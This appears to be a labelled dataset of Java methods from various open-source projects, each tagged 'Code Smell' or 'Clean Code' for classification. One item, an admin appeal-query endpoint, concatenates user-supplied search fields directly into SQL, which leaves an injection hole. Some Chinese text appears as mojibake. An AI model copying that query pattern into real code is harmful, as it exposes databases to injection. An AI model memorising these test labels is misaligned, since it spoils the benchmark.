"public static Map<String,String> getOptionsKeyNameMap(List<?> setting,String fieldName,Integer label){
  Map<String,String> keyMap=new HashMap<>();
  if (""flowName"".equals(fieldName)) {
    return keyMap;
  }
  String nameKey=getFieldNameKey(fieldName,label);
  if (CollectionUtil.isNotEmpty(setting)) {
    for (    Object o : setting) {
      String jsonStr=StrUtil.toString(o);
      Object name="""";
      if (BaseUtil.isJSON(jsonStr)) {
        Object object=JSON.parse(jsonStr);
        if (object instanceof JSONObject) {
          JSONObject jsonObject=(JSONObject)object;
          if (jsonObject.containsKey(""name"")) {
            name=jsonObject.get(""name"");
          }
          if (jsonObject.containsKey(""type"")) {
            name=jsonObject.get(""value"");
          }
          if (jsonObject.containsKey(""startNumber"")) {
            name=jsonObject.get(""startNumber"");
          }
        }
 else         if (object instanceof JSONArray) {
          JSONArray jsonArray=(JSONArray)object;
          name=jsonArray.get(0);
        }
 else {
          name=object;
        }
      }
 else {
        name=jsonStr;
      }
      keyMap.put(nameKey + ""Options."" + name,StrUtil.toString(name));
    }
  }
  return keyMap;
}",1,Code Smell
"@Override public int eval0(int x,int z,int center,@NonNull int[] v){
  if (center == ID_MUSHROOM_ISLAND) {
    return v[0] != ID_OCEAN && v[1] != ID_OCEAN && v[2] != ID_OCEAN && v[3] != ID_OCEAN ? center : ID_MUSHROOM_ISLAND_SHORE;
  }
  if (isJungle(center)) {
    if (isJungleCompatible(v[0]) && isJungleCompatible(v[1]) && isJungleCompatible(v[2])&& isJungleCompatible(v[3])) {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_BEACH;
    }
 else {
      return ID_JUNGLE_EDGE;
    }
  }
 else   if (center == ID_EXTREME_HILLS || center == ID_EXTREME_HILLS_WITH_TREES || center == ID_EXTREME_HILLS_EDGE) {
    if (isBiomeOceanic(center)) {
      return center;
    }
 else {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_STONE_BEACH;
    }
  }
 else   if (isSnowyBiome(center)) {
    if (isBiomeOceanic(center)) {
      return center;
    }
 else {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_COLD_BEACH;
    }
  }
 else   if (center == ID_MESA || center == ID_MESA_ROCK) {
    if (!isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3])) {
      return isMesa(v[0]) && isMesa(v[1]) && isMesa(v[2])&& isMesa(v[3]) ? center : ID_DESERT;
    }
 else {
      return center;
    }
  }
 else   if (center == ID_OCEAN || center == ID_DEEP_OCEAN || center == ID_RIVER || center == ID_SWAMPLAND) {
    return center;
  }
 else {
    return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_BEACH;
  }
}",1,Code Smell
"@PostMapping(value=""/challenge/{name}"",params=""action=submit"") @Operation(description=""Post your answer to the challenge for a given challenge"") public String postController(@ModelAttribute ChallengeForm challengeForm,Model model,@PathVariable String name){
  var challengeDefinition=findByShortName(name);
  if (!isChallengeEnabled(challengeDefinition)) {
    model.addAttribute(""answerIncorrect"",""This challenge has been disabled."");
  }
 else {
    var challenge=challenges.findChallenge(name,runtimeEnvironment).orElseThrow(() -> new ChallengeConfigurationException(configError(""Challenge '%s' not found for environment: '%s'"",name,runtimeEnvironment.getRuntimeEnvironment().name())));
    if (challenge.answerCorrect(challengeForm.solution())) {
      scoreCard.completeChallenge(challengeDefinition);
      if (ctfModeEnabled) {
        if (!Strings.isNullOrEmpty(ctfServerAddress) && !ctfServerAddress.equals(""not_set"")) {
          if (challenge instanceof Challenge8) {
            if (!Strings.isNullOrEmpty(keyToProvideToHost) && !keyToProvideToHost.equals(""not_set"")) {
              model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following answer in the CTF instance at "" + ctfServerAddress + ""for which you get your code: ""+ keyToProvideToHost);
            }
          }
 else           if (challenge instanceof Challenge30) {
            if (!Strings.isNullOrEmpty(keyToProvideToHostForChallenge30) && !keyToProvideToHostForChallenge30.equals(""not_set"")) {
              model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following answer in the CTF instance at "" + ctfServerAddress + ""for which you get your code: ""+ keyToProvideToHostForChallenge30);
            }
          }
 else           if (challenge instanceof Challenge37) {
            if (!Strings.isNullOrEmpty(getKeyToProvideToHostChallenge37) && !keyToProvideToHostForChallenge30.equals(""not_set"")) {
              model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following answer in the CTF instance at "" + ctfServerAddress + ""for which you get your code: ""+ getKeyToProvideToHostChallenge37);
            }
          }
 else {
            model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the same answer in the ctf-instance of the app: "" + ctfServerAddress);
          }
        }
 else {
          String code=generateCode(challengeDefinition);
          model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following code in CTF scoring: "" + code);
        }
      }
 else {
        model.addAttribute(""answerCorrect"",""Your answer is correct!"");
      }
    }
 else {
      model.addAttribute(""answerIncorrect"",""Your answer is incorrect, try harder ;-)"");
    }
  }
  addChallengeUI(model,challengeDefinition);
  includeScoringStatus(model,challengeDefinition);
  enrichWithHintsAndReasons(model);
  fireEnding(model);
  return ""challenge"";
}",1,Code Smell
"@Override public void onSizeChanged(int height,boolean isWidthGreater){
  if (!isPremium) {
    return;
  }
  if (height > dp(50) && keyboardVisible && !AndroidUtilities.isInMultiwindow && !AndroidUtilities.isTablet()) {
    if (isWidthGreater) {
      keyboardHeightLand=height;
      MessagesController.getGlobalEmojiSettings().edit().putInt(""kbd_height_land3"",keyboardHeightLand).commit();
    }
 else {
      keyboardHeight=height;
      MessagesController.getGlobalEmojiSettings().edit().putInt(""kbd_height"",keyboardHeight).commit();
    }
  }
  if (emojiViewVisible) {
    int newHeight=(isWidthGreater ? keyboardHeightLand : keyboardHeight);
    FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)emojiView.getLayoutParams();
    if (layoutParams.width != AndroidUtilities.displaySize.x || layoutParams.height != newHeight) {
      layoutParams.width=AndroidUtilities.displaySize.x;
      layoutParams.height=newHeight;
      emojiView.setLayoutParams(layoutParams);
      emojiPadding=layoutParams.height;
      keyboardNotifier.fire();
      sizeNotifierFrameLayout.requestLayout();
    }
  }
  if (lastSizeChangeValue1 == height && lastSizeChangeValue2 == isWidthGreater) {
    return;
  }
  lastSizeChangeValue1=height;
  lastSizeChangeValue2=isWidthGreater;
  boolean oldValue=keyboardVisible;
  if (currentCell != null) {
    final EditTextBoldCursor editText=currentCell.getEditField();
    keyboardVisible=editText.isFocused() && keyboardNotifier.keyboardVisible() && height > 0;
  }
 else {
    keyboardVisible=false;
  }
  if (keyboardVisible && emojiViewVisible) {
    showEmojiPopup(0);
  }
  if (emojiPadding != 0 && !keyboardVisible && keyboardVisible != oldValue && !emojiViewVisible) {
    emojiPadding=0;
    keyboardNotifier.fire();
    sizeNotifierFrameLayout.requestLayout();
  }
  if (keyboardVisible && waitingForKeyboardOpen) {
    waitingForKeyboardOpen=false;
    AndroidUtilities.cancelRunOnUIThread(openKeyboardRunnable);
  }
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.diceStickersDidLoad) {
    String name=(String)args[0];
    if (INTERACTIONS_STICKER_PACK.equals(name)) {
      checkStickerPack();
    }
  }
 else   if (id == NotificationCenter.onEmojiInteractionsReceived) {
    if (NekoConfig.disableRemoteEmojiInteractions.Bool())     return;
    long dialogId=(long)args[0];
    TLRPC.TL_sendMessageEmojiInteraction action=(TLRPC.TL_sendMessageEmojiInteraction)args[1];
    if (dialogId == this.dialogId && supportedEmoji.contains(action.emoticon)) {
      int messageId=action.msg_id;
      if (action.interaction.data != null) {
        try {
          JSONObject jsonObject=new JSONObject(action.interaction.data);
          JSONArray array=jsonObject.getJSONArray(""a"");
          for (int i=0; i < array.length(); i++) {
            JSONObject actionObject=array.getJSONObject(i);
            int animation=actionObject.optInt(""i"",1) - 1;
            double time=actionObject.optDouble(""t"",0.0);
            AndroidUtilities.runOnUIThread(new Runnable(){
              @Override public void run(){
                findViewAndShowAnimation(messageId,animation);
              }
            }
,(long)(time * 1000));
          }
        }
 catch (        JSONException e) {
          e.printStackTrace();
        }
      }
    }
  }
 else   if (id == NotificationCenter.updateInterfaces) {
    Integer printingType=MessagesController.getInstance(currentAccount).getPrintingStringType(dialogId,threadMsgId);
    if (printingType != null && printingType == 5) {
      cancelHintRunnable();
    }
  }
}",1,Code Smell
"public long procConsumeResult(boolean isFilterConsume){
  long dltTime=System.currentTimeMillis() - this.lastRptTIme;
  return procConsumeResult(isFilterConsume,this.reqProcType,this.errCode,this.msgSize,this.isEscLimit,this.limitDlt,this.curDataDlt,this.isRequireSlow) - dltTime;
}
/** 
 * Process the consume result.
 * @param isFilterConsume if current consume should be filtered
 * @param reqProcType     type information
 * @param errCode         error code
 * @param msgSize         message size
 * @param isReqEscLimit   if the rsplimitDlt is ignored in current consume
 * @param rsplimitDlt     max offset of the current consume
 * @param lastDataDlt     offset of the last data fetch
 * @param isRequireSlow  if the server requires slow down
 * @return message size per minute
 */
public long procConsumeResult(boolean isFilterConsume,int reqProcType,int errCode,int msgSize,boolean isReqEscLimit,long rsplimitDlt,long lastDataDlt,boolean isRequireSlow){
  if (lastDataDlt >= 0) {
    this.lastDataRdDlt=lastDataDlt;
  }
  this.recvMsgSize+=msgSize;
  this.recvMsgInMin+=msgSize;
  long currTime=System.currentTimeMillis();
  checkAndCalcDataLimit(currTime);
  if (errCode != TErrCodeConstants.NOT_FOUND && errCode != TErrCodeConstants.SUCCESS) {
    return rsplimitDlt;
  }
  if (msgSize == 0 && errCode != TErrCodeConstants.SUCCESS) {
    this.totalRcvZeroCount+=1;
  }
 else {
    this.totalRcvZeroCount=0;
  }
  if (this.totalRcvZeroCount > 0) {
    if (this.groupFlowCtrlRuleHandler.getMinZeroCnt() != Integer.MAX_VALUE) {
      return groupFlowCtrlRuleHandler.getCurFreqLimitTime(this.totalRcvZeroCount,(int)rsplimitDlt);
    }
 else {
      return defFlowCtrlRuleHandler.getCurFreqLimitTime(this.totalRcvZeroCount,(int)rsplimitDlt);
    }
  }
  if (isReqEscLimit) {
    return 0;
  }
 else {
    if (this.recvMsgInMin >= this.curFlowCtrlVal.dataLtInSize || this.recvMsgSize >= this.limitMsgInSec) {
      return this.curFlowCtrlVal.freqLtInMs > rsplimitDlt ? this.curFlowCtrlVal.freqLtInMs : rsplimitDlt;
    }
    if (errCode == TErrCodeConstants.SUCCESS) {
      if (isFilterConsume && filterCtrlItem.getFreqLtInMs() >= 0) {
        if (isRequireSlow) {
          return this.filterCtrlItem.getZeroCnt();
        }
 else {
          return this.filterCtrlItem.getFreqLtInMs();
        }
      }
 else       if (!isFilterConsume && filterCtrlItem.getDataLtInSZ() >= 0) {
        return this.filterCtrlItem.getDataLtInSZ();
      }
    }
    return rsplimitDlt;
  }
}",1,Code Smell
"@Override public void render(long positionUs,long elapsedRealtimeUs) throws ExoPlaybackException {
  if (outputStreamEnded) {
    try {
      audioSink.playToEndOfStream();
    }
 catch (    AudioSink.WriteException e) {
      throw ExoPlaybackException.createForRenderer(e,getIndex());
    }
    return;
  }
  if (inputFormat == null) {
    flagsOnlyBuffer.clear();
    int result=readSource(formatHolder,flagsOnlyBuffer,true);
    if (result == C.RESULT_FORMAT_READ) {
      onInputFormatChanged(formatHolder.format);
    }
 else     if (result == C.RESULT_BUFFER_READ) {
      Assertions.checkState(flagsOnlyBuffer.isEndOfStream());
      inputStreamEnded=true;
      processEndOfStream();
      return;
    }
 else {
      return;
    }
  }
  maybeInitDecoder();
  if (decoder != null) {
    try {
      TraceUtil.beginSection(""drainAndFeed"");
      while (drainOutputBuffer()) {
      }
      while (feedInputBuffer()) {
      }
      TraceUtil.endSection();
    }
 catch (    AudioDecoderException|AudioSink.ConfigurationException|AudioSink.InitializationException|AudioSink.WriteException e) {
      throw ExoPlaybackException.createForRenderer(e,getIndex());
    }
    decoderCounters.ensureUpdated();
  }
}
",1,Code Smell
"public void send(int state,boolean notify,int scheduleDate,int ttl){
  if (textureView == null) {
    return;
  }
  stopProgressTimer();
  if (videoPlayer != null) {
    videoPlayer.releasePlayer(true);
    videoPlayer=null;
  }
  if (state == 4) {
    if (videoEncoder != null && recordedTime > 800) {
      videoEncoder.stopRecording(VideoRecorder.ENCODER_SEND_SEND,ttl);
      return;
    }
    if (BuildVars.DEBUG_VERSION && !cameraFile.exists()) {
      FileLog.e(new RuntimeException(""file not found :( round video""));
    }
    if (videoEditedInfo.needConvert()) {
      file=null;
      encryptedFile=null;
      key=null;
      iv=null;
      double totalDuration=videoEditedInfo.estimatedDuration;
      long startTime=videoEditedInfo.startTime >= 0 ? videoEditedInfo.startTime : 0;
      long endTime=videoEditedInfo.endTime >= 0 ? videoEditedInfo.endTime : videoEditedInfo.estimatedDuration;
      videoEditedInfo.estimatedDuration=endTime - startTime;
      videoEditedInfo.estimatedSize=Math.max(1,(long)(size * (videoEditedInfo.estimatedDuration / totalDuration)));
      videoEditedInfo.bitrate=1000000;
      if (videoEditedInfo.startTime > 0) {
        videoEditedInfo.startTime*=1000;
      }
      if (videoEditedInfo.endTime > 0) {
        videoEditedInfo.endTime*=1000;
      }
      FileLoader.getInstance(currentAccount).cancelFileUpload(cameraFile.getAbsolutePath(),false);
    }
 else {
      videoEditedInfo.estimatedSize=Math.max(1,size);
    }
    videoEditedInfo.file=file;
    videoEditedInfo.encryptedFile=encryptedFile;
    videoEditedInfo.key=key;
    videoEditedInfo.iv=iv;
    MediaController.PhotoEntry entry=new MediaController.PhotoEntry(0,0,0,cameraFile.getAbsolutePath(),0,true,0,0,0);
    entry.ttl=ttl;
    delegate.sendMedia(entry,videoEditedInfo,notify,scheduleDate,false);
    if (scheduleDate != 0) {
      startAnimation(false,false);
    }
    MediaController.getInstance().requestAudioFocus(false);
  }
 else {
    cancelled=recordedTime < 800;
    recording=false;
    int reason;
    if (cancelled) {
      reason=4;
    }
 else {
      reason=state == 3 ? 2 : 5;
    }
    if (cameraThread != null) {
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.recordStopped,recordingGuid,reason);
      int send;
      if (cancelled) {
        send=0;
      }
 else       if (state == 3) {
        send=2;
      }
 else {
        send=1;
      }
      saveLastCameraBitmap();
      cameraThread.shutdown(send,ttl);
      cameraThread=null;
    }
    if (cancelled) {
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.audioRecordTooShort,recordingGuid,true,(int)recordedTime);
      startAnimation(false,false);
      MediaController.getInstance().requestAudioFocus(false);
    }
  }
}",1,Code Smell
"@RequiresPermissions(""otc:appeal:page-query"") @PostMapping(""page-query"") @AccessLog(module=AdminModule.OTC,operation=""鍒嗛〉鏌ユ壘鍚庡彴鐢宠瘔Appeal"") public MessageResult pageQuery(PageModel pageModel,AppealScreen screen){
  StringBuilder headSqlBuilder=new StringBuilder(""select a.id appealId,"").append(""b.member_name advertiseCreaterUserName,b.member_real_name advertiseCreaterName,"").append(""b.customer_name customerUserName,b.customer_real_name customerName,"").append(""c.username initiatorUsername,c.real_name initiatorName,"").append(""d.username associateUsername,d.real_name associateName,"").append(""b.commission fee,b.number,b.money,b.order_sn orderSn,b.create_time transactionTime,"").append(""a.create_time createTime,a.deal_with_time dealWithTime,b.pay_mode payMode, e.name coinName,"").append(""b.status orderStatus,a.is_success isSuccess,b.advertise_type advertiseType,a.status,a.remark "");
  StringBuilder countHead=new StringBuilder(""select count(*) "");
  StringBuilder endSql=new StringBuilder(""from appeal a,otc_order b,member c,member d,otc_coin e"").append("" where a.order_id = b.id and a.initiator_id = c.id and a.associate_id = d.id "").append("" and b.coin_id = e.id and b.status != 0 "");
  if (!StringUtils.isEmpty(screen.getNegotiant())) {
    endSql.append("" and (b.customer_name like '%"" + screen.getNegotiant() + ""%'"").append("" or b.customer_real_name like '%"" + screen.getNegotiant() + ""%')"");
  }
  if (!StringUtils.isEmpty(screen.getComplainant())) {
    endSql.append("" and (b.member_name like '%"" + screen.getComplainant() + ""%'"").append("" or b.member_real_name like '%"" + screen.getComplainant() + ""%')"");
  }
  if (screen.getAdvertiseType() != null) {
    endSql.append("" and b.advertise_type = "" + screen.getAdvertiseType().getOrdinal() + "" "");
  }
  if (screen.getSuccess() != null) {
    endSql.append("" and (a.is_success = "" + screen.getSuccess().getOrdinal() + "" and a.deal_with_time is not null) "");
  }
 else {
    if (screen.getAuditing()) {
      endSql.append("" and a.is_success is null "");
    }
  }
  if (!StringUtils.isEmpty(screen.getUnit())) {
    endSql.append("" and lower(e.unit) = '"" + screen.getUnit().toLowerCase() + ""'"");
  }
  if (screen.getStatus() != null && screen.getStatus().getOrdinal() != 0) {
    endSql.append("" and b.status = "" + screen.getStatus().getOrdinal());
  }
  Page page=appealService.createNativePageQuery(countHead.append(endSql),headSqlBuilder.append(endSql),pageModel,Transformers.ALIAS_TO_ENTITY_MAP);
  return success(""鑾峰彇鎴愬姛"",page);
}",1,Code Smell
"private void createNewTable(TiDBExpressionGenerator gen,StringBuilder sb){
  sb.append(""("");
  for (int i=0; i < columns.size(); i++) {
    if (i != 0) {
      sb.append("", "");
    }
    sb.append(columns.get(i).getName());
    sb.append("" "");
    TiDBCompositeDataType type;
    type=TiDBCompositeDataType.getRandom();
    appendType(sb,type);
    sb.append("" "");
    boolean isGeneratedColumn=Randomly.getBooleanWithRatherLowProbability();
    if (isGeneratedColumn) {
      sb.append("" AS ("");
      sb.append(TiDBVisitor.asString(gen.generateExpression()));
      sb.append("") "");
      sb.append(Randomly.fromOptions(""STORED"",""VIRTUAL""));
      sb.append("" "");
      errors.add(""Generated column can refer only to generated columns defined prior to it"");
      errors.add(""'Defining a virtual generated column as primary key' is not supported for generated columns."");
      errors.add(""contains a disallowed function."");
      errors.add(""cannot refer to auto-increment column"");
    }
    if (Randomly.getBooleanWithRatherLowProbability()) {
      sb.append(""CHECK ("");
      sb.append(TiDBVisitor.asString(gen.generateExpression()));
      sb.append("") "");
    }
    if (Randomly.getBooleanWithRatherLowProbability()) {
      sb.append(""NOT NULL "");
    }
    if (Randomly.getBoolean() && type.getPrimitiveDataType().canHaveDefault() && !isGeneratedColumn) {
      sb.append(""DEFAULT "");
      sb.append(TiDBVisitor.asString(gen.generateConstant(type.getPrimitiveDataType())));
      sb.append("" "");
      errors.add(""Invalid default value"");
      errors.add(""All parts of a PRIMARY KEY must be NOT NULL; if you need NULL in a key, use UNIQUE instead"");
    }
    if (type.getPrimitiveDataType() == TiDBDataType.INT && Randomly.getBooleanWithRatherLowProbability() && !isGeneratedColumn) {
      sb.append("" AUTO_INCREMENT "");
      errors.add(""there can be only one auto column and it must be defined as a key"");
    }
    if (Randomly.getBooleanWithRatherLowProbability() && canUseAsUnique(type)) {
      sb.append(""UNIQUE "");
    }
    if (Randomly.getBooleanWithRatherLowProbability() && allowPrimaryKey && !primaryKeyAsTableConstraints&& canUseAsUnique(type)&& !isGeneratedColumn) {
      sb.append(""PRIMARY KEY "");
      allowPrimaryKey=false;
    }
  }
  if (primaryKeyAsTableConstraints) {
    sb.append("", PRIMARY KEY("");
    sb.append(Randomly.nonEmptySubset(columns).stream().map(c -> c.getName()).collect(Collectors.joining("", "")));
    sb.append("")"");
    errors.add("" used in key specification without a key length"");
  }
  sb.append("")"");
  if (Randomly.getBooleanWithRatherLowProbability()) {
    sb.append(""PARTITION BY HASH("");
    sb.append(TiDBVisitor.asString(gen.generateExpression()));
    sb.append("") "");
    sb.append(""PARTITIONS "");
    sb.append(Randomly.getNotCachedInteger(1,100));
    errors.add(""Constant, random or timezone-dependent expressions in (sub)partitioning function are not allowed"");
    errors.add(""This partition function is not allowed"");
    errors.add(""A PRIMARY KEY must include all columns in the table's partitioning function"");
    errors.add(""A UNIQUE INDEX must include all columns in the table's partitioning function"");
    errors.add(""is of a not allowed type for this type of partitioning"");
    errors.add(""The PARTITION function returns the wrong type"");
  }
}",1,Code Smell
"private void processBoostDialog(Long peerId,Runnable dismissLoading,Browser.Progress progress){
  processBoostDialog(peerId,dismissLoading,progress,null);
}
private void processBoostDialog(Long peerId,Runnable dismissLoading,Browser.Progress progress,ChatMessageCell chatMessageCell){
  ChannelBoostsController boostsController=MessagesController.getInstance(currentAccount).getBoostsController();
  if (progress != null) {
    progress.init();
  }
  boostsController.getBoostsStats(peerId,boostsStatus -> {
    if (boostsStatus == null) {
      if (progress != null) {
        progress.end();
      }
      if (dismissLoading != null) {
        dismissLoading.run();
      }
      return;
    }
    boostsController.userCanBoostChannel(peerId,boostsStatus,canApplyBoost -> {
      if (progress != null) {
        progress.end();
      }
      BaseFragment lastFragment=getLastFragment();
      if (lastFragment == null) {
        return;
      }
      Theme.ResourcesProvider resourcesProvider=lastFragment.getResourceProvider();
      if (lastFragment.getLastStoryViewer() != null && lastFragment.getLastStoryViewer().isFullyVisible()) {
        resourcesProvider=lastFragment.getLastStoryViewer().getResourceProvider();
      }
      LimitReachedBottomSheet limitReachedBottomSheet=new LimitReachedBottomSheet(lastFragment,this,TYPE_BOOSTS_FOR_USERS,currentAccount,resourcesProvider);
      limitReachedBottomSheet.setCanApplyBoost(canApplyBoost);
      boolean isCurrentChat=false;
      if (lastFragment instanceof ChatActivity) {
        isCurrentChat=((ChatActivity)lastFragment).getDialogId() == peerId;
      }
 else       if (lastFragment instanceof DialogsActivity) {
        DialogsActivity dialogsActivity=((DialogsActivity)lastFragment);
        isCurrentChat=dialogsActivity.rightSlidingDialogContainer != null && dialogsActivity.rightSlidingDialogContainer.getCurrentFragmetDialogId() == peerId;
      }
      limitReachedBottomSheet.setBoostsStats(boostsStatus,isCurrentChat);
      limitReachedBottomSheet.setDialogId(peerId);
      limitReachedBottomSheet.setChatMessageCell(chatMessageCell);
      lastFragment.showDialog(limitReachedBottomSheet);
      try {
        if (dismissLoading != null) {
          dismissLoading.run();
        }
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
);
  }
);
}
",1,Code Smell
"public void set(TL_stories.StoryItem storyItem,EmojiAnimationsOverlay animationsOverlay){
  ArrayList<TL_stories.MediaArea> mediaAreas=storyItem != null ? storyItem.media_areas : null;
  set(storyItem,mediaAreas,animationsOverlay);
}
public void set(TL_stories.StoryItem storyItem,ArrayList<TL_stories.MediaArea> mediaAreas,EmojiAnimationsOverlay animationsOverlay){
  if (mediaAreas == lastMediaAreas && (mediaAreas == null || lastMediaAreas == null || mediaAreas.size() == lastMediaAreas.size())) {
    return;
  }
  if (hintView != null) {
    hintView.hide();
    hintView=null;
  }
  for (int i=0; i < getChildCount(); ++i) {
    View child=getChildAt(i);
    if (child != hintsContainer) {
      removeView(child);
      i--;
    }
  }
  selectedArea=null;
  parentHighlightScaleAlpha.set(0,true);
  invalidate();
  onHintVisible(false);
  malicious=false;
  lastMediaAreas=mediaAreas;
  if (mediaAreas == null) {
    return;
  }
  shined=false;
  final float W=1080, H=1920;
  double totalArea=0;
  for (int i=0; i < mediaAreas.size(); ++i) {
    TL_stories.MediaArea mediaArea=mediaAreas.get(i);
    if (mediaArea != null && mediaArea.coordinates != null) {
      View areaView;
      if (mediaArea instanceof TL_stories.TL_mediaAreaSuggestedReaction) {
        StoryReactionWidgetView storyReactionWidgetView=new StoryReactionWidgetView(getContext(),this,(TL_stories.TL_mediaAreaSuggestedReaction)mediaArea,animationsOverlay);
        areaView=storyReactionWidgetView;
        if (storyItem != null) {
          storyReactionWidgetView.setViews(storyItem.views,false);
        }
        ScaleStateListAnimator.apply(areaView);
      }
 else {
        areaView=new AreaView(getContext(),parentView,mediaArea);
      }
      areaView.setOnClickListener(this);
      addView(areaView);
      totalArea+=(mediaArea.coordinates.w / 100f * W) * (mediaArea.coordinates.h / 100f * H);
    }
  }
  malicious=false;
  hintsContainer.bringToFront();
}",1,Code Smell
"/** 
 * 鑾峰彇鍏虫敞鐨勭敤鎴蜂俊鎭�
 * @param followSearchDTO
 * @param currentUser
 * @return
 */
@Override public PageInfo<FollowDTO> getFollowUsers(FollowSearchDTO followSearchDTO,UserSsoDTO currentUser){
  Long getBigCow=followSearchDTO.getGetBigCow();
  Long getFan=followSearchDTO.getGetFan();
  if (getBigCow == null && getFan == null) {
    throw BusinessException.build(ResponseCode.NOT_EXISTS,""鍙傛暟涓嶅悎瑙�"");
  }
  if (getBigCow != null && getFan != null) {
    throw BusinessException.build(ResponseCode.NOT_EXISTS,""鍙傛暟涓嶅悎瑙�"");
  }
  FollowPoExample example=new FollowPoExample();
  FollowPoExample.Criteria criteria=example.createCriteria().andStateEqualTo(true);
  if (getBigCow != null) {
    criteria.andFromUserEqualTo(getBigCow);
  }
  if (getFan != null) {
    criteria.andToUserEqualTo(getFan);
  }
  example.setOrderByClause(""`id` desc"");
  PageHelper.startPage(followSearchDTO.getCurrentPage(),followSearchDTO.getPageSize());
  List<FollowPo> followPos=followPoMapper.selectByExample(example);
  PageInfo<FollowDTO> pageInfo=FollowMS.INSTANCE.toPage(new PageInfo<>(followPos));
  pageInfo.getList().forEach(followDTO -> {
    UserDTO userDTO=new UserDTO();
    if (getBigCow != null) {
      userDTO=userService.getById(followDTO.getToUser());
    }
    if (getFan != null) {
      userDTO=userService.getById(followDTO.getFromUser());
    }
    followDTO.setName(userDTO.getName());
    followDTO.setPicture(userDTO.getPicture());
    followDTO.setIntro(userDTO.getIntro());
    followDTO.setLevel(userlevelService.getByUserId(userDTO.getId()).get(0).getLevel());
    followDTO.setLikeCount(likeService.getUserLikeCount(userDTO.getId()));
    List<ArticleReadDTO> articleReadDTOS=articleService.getUserReadCount(Collections.singletonList(userDTO.getId()));
    followDTO.setReadCount(CollectionUtils.isEmpty(articleReadDTOS) ? 0L : articleReadDTOS.get(0).getArticleReadCount());
    if (currentUser != null) {
      FollowDTO followed=getByFromToUser(currentUser.getUserId(),userDTO.getId(),false);
      if (followed != null) {
        followDTO.setIsFollow(true);
      }
    }
  }
);
  return pageInfo;
}",1,Code Smell
"void setState(@State int state){
  setState(state,true);
}
private void setState(@State int state,boolean animation){
  if (null == mSearchBar || null == mSearchBarMover || null == mViewTransition || null == mSearchLayout) {
    return;
  }
  if (mState != state) {
    int oldState=mState;
    mState=state;
switch (oldState) {
case STATE_NORMAL:
      if (state == STATE_SIMPLE_SEARCH) {
        mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
        mSearchBarMover.returnSearchBarPosition();
        selectSearchFab(animation);
      }
 else       if (state == STATE_SEARCH) {
        mViewTransition.showView(1,animation);
        mSearchLayout.scrollSearchContainerToTop();
        mSearchBar.setState(SearchBar.STATE_SEARCH,animation);
        mSearchBarMover.returnSearchBarPosition();
        selectSearchFab(animation);
      }
 else       if (state == STATE_SEARCH_SHOW_LIST) {
        mViewTransition.showView(1,animation);
        mSearchLayout.scrollSearchContainerToTop();
        mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
        mSearchBarMover.returnSearchBarPosition();
        selectSearchFab(animation);
      }
    break;
case STATE_SIMPLE_SEARCH:
  if (state == STATE_NORMAL) {
    mSearchBar.setState(SearchBar.STATE_NORMAL,animation);
    mSearchBarMover.returnSearchBarPosition();
    selectActionFab(animation);
  }
 else   if (state == STATE_SEARCH) {
    mViewTransition.showView(1,animation);
    mSearchLayout.scrollSearchContainerToTop();
    mSearchBar.setState(SearchBar.STATE_SEARCH,animation);
    mSearchBarMover.returnSearchBarPosition();
  }
 else   if (state == STATE_SEARCH_SHOW_LIST) {
    mViewTransition.showView(1,animation);
    mSearchLayout.scrollSearchContainerToTop();
    mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
    mSearchBarMover.returnSearchBarPosition();
  }
break;
case STATE_SEARCH:
if (state == STATE_NORMAL) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_NORMAL,animation);
mSearchBarMover.returnSearchBarPosition();
selectActionFab(animation);
}
 else if (state == STATE_SIMPLE_SEARCH) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
mSearchBarMover.returnSearchBarPosition();
}
 else if (state == STATE_SEARCH_SHOW_LIST) {
mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
mSearchBarMover.returnSearchBarPosition();
}
break;
case STATE_SEARCH_SHOW_LIST:
if (state == STATE_NORMAL) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_NORMAL,animation);
mSearchBarMover.returnSearchBarPosition();
selectActionFab(animation);
}
 else if (state == STATE_SIMPLE_SEARCH) {
mViewTransition.showView(0,animation);
mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
mSearchBarMover.returnSearchBarPosition();
}
 else if (state == STATE_SEARCH) {
mSearchBar.setState(SearchBar.STATE_SEARCH,animation);
mSearchBarMover.returnSearchBarPosition();
}
break;
}
}
}",1,Code Smell
"public GProRetentionGuildListRsp(){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
}
public GProRetentionGuildListRsp(ArrayList<GProRetentionChannelInfo> arrayList,int i2,byte[] bArr,boolean z){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
  this.recommendChannels=arrayList;
  this.nextTs=i2;
  this.cookies=bArr;
  this.isEnd=z;
}",0,Clean Code
"public static RollRogueBuffScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),data).checkInitialized();
}
